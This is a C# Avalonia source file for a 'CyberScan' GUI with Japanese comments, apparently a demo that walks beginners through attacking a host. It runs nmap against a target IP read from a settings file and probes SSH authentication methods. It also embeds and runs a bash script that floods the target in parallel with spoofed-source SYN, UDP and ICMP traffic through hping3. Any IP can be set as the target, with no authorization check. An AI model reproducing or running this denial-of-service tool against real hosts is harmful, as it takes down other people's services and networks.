using Avalonia;
using Avalonia.Controls;
using Avalonia.Input;
using Avalonia.Interactivity;
using Avalonia.Threading;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace CyberScan
{
    public partial class MainWindow : Window
    {
        // デフォルト設定
        private string _targetIp = "127.0.0.1";
        private int _ddosDuration = 15; // デフォルト15秒
        
        // 設定ファイル名
        private const string ConfigFileName = "Settings.txt";
        // 攻撃用スクリプト名
        private const string AttackScriptName = "attack.sh";

        public MainWindow()
        {
            InitializeComponent();
            
            // キーボードイベントとウィンドウ開始イベントの登録
            this.KeyDown += OnKeyDown;
            this.Opened += OnWindowOpened;
        }

        private void OnWindowOpened(object? sender, EventArgs e)
        {
            LoadSettings();
            // 初回起動時にスクリプトがなければ生成しておく（最新版のテンプレートを使用）
            _ = GenerateAttackScriptTemplateAsync();

            WriteLog("SYSTEM INITIALIZED.");
            WriteLog($"TARGET LOCKED: {_targetIp}");
            WriteLog($"ATTACK TIMEOUT SET TO: {_ddosDuration} SECONDS");
            WriteLog("WAITING FOR USER AUTHORIZATION...");
        }

        // Settings.txt から設定を読み込む
        private void LoadSettings()
        {
            try
            {
                if (File.Exists(ConfigFileName))
                {
                    string[] lines = File.ReadAllLines(ConfigFileName);
                    foreach (string line in lines)
                    {
                        // コメント行や空行はスキップ
                        if (string.IsNullOrWhiteSpace(line) || line.StartsWith("#")) continue;

                        string[] parts = line.Split('=');
                        if (parts.Length == 2)
                        {
                            string key = parts[0].Trim();
                            string value = parts[1].Trim();

                            if (key.Equals("IP", StringComparison.OrdinalIgnoreCase))
                            {
                                _targetIp = value;
                            }
                            else if (key.Equals("DDoSTime", StringComparison.OrdinalIgnoreCase))
                            {
                                if (int.TryParse(value, out int duration))
                                {
                                    _ddosDuration = duration;
                                }
                            }
                        }
                    }
                }
                else
                {
                    // ファイルがない場合はデフォルト値で作成しておく
                    string defaultSettings = "IP=127.0.0.1\nDDoSTime=15";
                    File.WriteAllText(ConfigFileName, defaultSettings);
                    WriteLog($"[CONFIG] {ConfigFileName} not found. Created default.");
                }
            }
            catch (Exception ex)
            {
                WriteLog($"[ERROR] Config load failed: {ex.Message}");
            }
            
            // UI更新
            if (TargetIpDisplay != null)
            {
                TargetIpDisplay.Text = _targetIp;
            }
        }

        // キー操作 (Ctrl+Q: 終了, F11: フルスクリーン切替)
        private void OnKeyDown(object? sender, KeyEventArgs e)
        {
            if (e.KeyModifiers == KeyModifiers.Control && e.Key == Key.Q)
            {
                Close();
            }
            
            if (e.Key == Key.F11)
            {
                if (WindowState == WindowState.FullScreen)
                {
                    WindowState = WindowState.Normal;
                    SystemDecorations = SystemDecorations.Full;
                    Topmost = false;
                }
                else
                {
                    WindowState = WindowState.FullScreen;
                    SystemDecorations = SystemDecorations.None;
                    Topmost = true;
                }
            }
        }

        // --- フェーズ1: ポートスキャン (偵察) ---
        private async void OnScanClick(object sender, RoutedEventArgs e)
        {
            ScanButton.IsEnabled = false;
            StatusText.Text = "STATUS: SCANNING NETWORK...";
            StatusText.Foreground = Avalonia.Media.Brushes.Yellow;

            WriteLog("\n==========================================");
            WriteLog($"[*] INITIATING PORT SCAN ON {_targetIp}...");
            WriteLog("==========================================");

            // Nmap実行 (-F: 高速スキャン)
            await RunAttackToolAsync("nmap", $"-F -sV {_targetIp}");

            WriteLog("\n[SCAN COMPLETE] ANALYZING VULNERABILITIES...");
            
            // フェーズ切り替え
            Phase1Panel.IsVisible = false;
            Phase2Panel.IsVisible = true;
            
            // 攻撃ボタンを有効化
            DosAttackButton.IsEnabled = true; 
            BruteForceButton.IsEnabled = true;

            StatusText.Text = "STATUS: VULNERABILITY DETECTED. SELECT ACTION.";
            StatusText.Foreground = Avalonia.Media.Brushes.Red;
        }

        // --- フェーズ2A: DoS攻撃 (Shell Script実行) ---
        private async void OnDosAttackClick(object sender, RoutedEventArgs e)
        {
            DisableAttackButtons();
            StatusText.Text = "STATUS: EXECUTING MAXIMUM LOAD ATTACK...";
            StatusText.Foreground = Avalonia.Media.Brushes.Red; // 警告色

            WriteLog("\n==========================================");
            WriteLog($"[*] INITIATING SHELL-SCRIPTED FLOOD ATTACK...");
            WriteLog($"[*] DURATION LIMIT: {_ddosDuration} SECONDS");
            WriteLog("[!] WARNING: EXTREME NETWORK LOAD.");
            WriteLog("==========================================");

            // スクリプトが存在することを確認（なければ生成）
            await GenerateAttackScriptTemplateAsync();

            // bashに引数を渡して実行: bash attack.sh <IP> <DURATION>
            // 例: bash attack.sh 192.168.1.1 30
            string args = $"{AttackScriptName} {_targetIp} {_ddosDuration}";
            await RunAttackToolAsync("bash", args);

            WriteLog("\n[ATTACK STOPPED] SHELL SCRIPT TERMINATED.");
            EnableAttackButtons();
            StatusText.Text = "STATUS: READY FOR NEXT COMMAND.";
        }

        // 攻撃用シェルスクリプトのテンプレート生成（ファイルがない場合のみ）
        private async Task GenerateAttackScriptTemplateAsync()
        {
            try
            {
                if (!File.Exists(AttackScriptName))
                {
                    // ファイルがない場合は、最新の attack.sh の内容で作成
                    // C#の文字列リテラルとして埋め込む（エスケープに注意: " は "" と記述）
                    string scriptContent = @"#!/bin/bash

# 引数の取得（デフォルト値を設定）
TARGET=${1:-""127.0.0.1""}
DURATION=${2:-""15""}

# 実行権限チェック（root推奨）
if [ ""$EUID"" -ne 0 ]; then 
  echo ""[!] WARNING: This script requires root privileges for hping3.""
fi

echo ""==========================================""
echo ""[*] TARGET: $TARGET""
echo ""[*] DURATION: ${DURATION}s""
echo ""==========================================""

echo ""[*] LAUNCHING 4 PARALLEL VECTORS...""

# 1. TCP SYN Flood (Port 443) - HTTPSサーバー狙い
timeout ${DURATION}s hping3 -S -p 443 --flood --rand-source $TARGET > /dev/null 2>&1 &
PID1=$!
echo ""[+] Vector 1 (TCP/443) Fired (PID: $PID1)""

# 2. TCP SYN Flood (Port 80) - HTTPサーバー狙い
timeout ${DURATION}s hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1 &
PID2=$!
echo ""[+] Vector 2 (TCP/80)  Fired (PID: $PID2)""

# 3. UDP Flood - 帯域幅狙い
timeout ${DURATION}s hping3 --udp --flood --rand-source $TARGET > /dev/null 2>&1 &
PID3=$!
echo ""[+] Vector 3 (UDP)     Fired (PID: $PID3)""

# 4. ICMP Large Packet Flood - パケット処理能力狙い
timeout ${DURATION}s hping3 -1 --flood -d 1200 --rand-source $TARGET > /dev/null 2>&1 &
PID4=$!
echo ""[+] Vector 4 (ICMP)    Fired (PID: $PID4)""

echo ""------------------------------------------""
echo ""[!] ALL GUNS BLAZING. HOLDING FIRE FOR ${DURATION}s...""

# 全てのバックグラウンドプロセスが終わるのを待つ
wait $PID1 $PID2 $PID3 $PID4

echo ""[*] CEASE FIRE. ATTACK COMPLETE.""
";
                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
                    
                    // 実行権限を付与 (chmod +x attack.sh)
                    // Linux環境でのみ動作するコマンド
                    Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit();
                    
                    WriteLog($"[SYSTEM] Generated attack script: {AttackScriptName}");
                }
            }
            catch (Exception ex)
            {
                WriteLog($"[ERROR] Failed to check/generate script: {ex.Message}");
            }
        }

        // --- フェーズ2B: パスワードクラック (SSH) ---
        private async void OnBruteForceClick(object sender, RoutedEventArgs e)
        {
            DisableAttackButtons();
            StatusText.Text = "STATUS: CRACKING PASSWORDS...";

            WriteLog("\n==========================================");
            WriteLog("[*] INITIATING BRUTE FORCE ATTACK (SSH)...");
            WriteLog("==========================================");

            // 体験用にNmapのSSH認証確認スクリプトを実行
            await RunAttackToolAsync("nmap", $"-p 22 --script ssh-auth-methods {_targetIp}");

            WriteLog("\n[ATTACK FINISHED] ACCESS ATTEMPTS LOGGED.");
            EnableAttackButtons();
            StatusText.Text = "STATUS: READY FOR NEXT COMMAND.";
        }

        // --- リセット処理 ---
        private void OnResetClick(object sender, RoutedEventArgs e)
        {
            LogOutput.Text = "";
            Phase2Panel.IsVisible = false;
            Phase1Panel.IsVisible = true;
            ScanButton.IsEnabled = true;
            
            StatusText.Text = "STATUS: WAITING FOR COMMAND";
            StatusText.Foreground = Avalonia.Media.Brushes.Yellow;
            
            LoadSettings(); 
            WriteLog("SYSTEM RESET. READY.");
        }

        private void DisableAttackButtons()
        {
            DosAttackButton.IsEnabled = false;
            BruteForceButton.IsEnabled = false;
        }

        private void EnableAttackButtons()
        {
            DosAttackButton.IsEnabled = true;
            BruteForceButton.IsEnabled = true;
        }

        // コマンド実行エンジン
        private async Task RunAttackToolAsync(string command, string args)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = new Process { StartInfo = psi };

                // 標準出力をリアルタイムで取得
                process.OutputDataReceived += (s, e) => 
                {
                    if (e.Data != null)
                    {
                        var translated = TranslateForBeginner(e.Data);
                        Dispatcher.UIThread.Post(() => WriteLog(translated));
                    }
                };
                
                // エラー出力も取得
                process.ErrorDataReceived += (s, e) =>
                {
                    if (e.Data != null) Dispatcher.UIThread.Post(() => WriteLog($"[STDERR] {e.Data}"));
                };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                await process.WaitForExitAsync();
            }
            catch (Exception ex)
            {
                WriteLog($"[ERROR] Command Execution Failed: {ex.Message}");
                // ツールが入っていない場合のデモ用表示
                await Task.Delay(1000);
                
                if (command.Contains("bash") || args.Contains("attack.sh"))
                {
                     WriteLog("[SIMULATION] Executing shell script sequence...");
                     WriteLog("[SIMULATION] Launching parallel vectors...");
                }
                else
                {
                    WriteLog("Target appears to be secure or tool not installed.");
                }
            }
        }

        // ログ翻訳ロジック
        private string TranslateForBeginner(string rawLog)
        {
            string output = rawLog;
            
            // Nmapの翻訳
            if (rawLog.Contains("80/tcp") && rawLog.Contains("open")) 
                output += "   <-- [発見] Webサーバー(HTTP)が動いています。";
            if (rawLog.Contains("443/tcp") && rawLog.Contains("open")) 
                output += "   <-- [発見] SSL Webサーバー(HTTPS)です。DoS攻撃の標的になります。";
            if (rawLog.Contains("22/tcp") && rawLog.Contains("open")) 
                output += "   <-- [発見] SSHポートです。パスワードクラック可能です。";
            
            // attack.sh の翻訳
            if (rawLog.Contains("Vector 1")) output = $"[攻撃プロセス起動] TCP SYN Flood (Port 443/HTTPS) 開始...";
            if (rawLog.Contains("Vector 2")) output = $"[攻撃プロセス起動] TCP SYN Flood (Port 80/HTTP) 開始...";
            if (rawLog.Contains("Vector 3")) output = $"[攻撃プロセス起動] UDP Flood (帯域幅枯渇攻撃) 開始...";
            if (rawLog.Contains("Vector 4")) output = $"[攻撃プロセス起動] ICMP Large Packet Flood (CPU負荷攻撃) 開始...";
            
            if (rawLog.Contains("ALL GUNS BLAZING"))
            {
                output = $"[全全開] 全ての攻撃ベクトルが最大出力で実行中。ネットワーク負荷が極大化しています...";
            }
            if (rawLog.Contains("CEASE FIRE"))
            {
                output = $"[攻撃停止] 制限時間に達しました。攻撃を終了します。";
            }
            
            return output;
        }

        private void WriteLog(string message)
        {
            if (LogOutput == null || LogScrollViewer == null) return;
            LogOutput.Text += $"{message}\n";
            LogScrollViewer.ScrollToEnd();
        }
    }
}
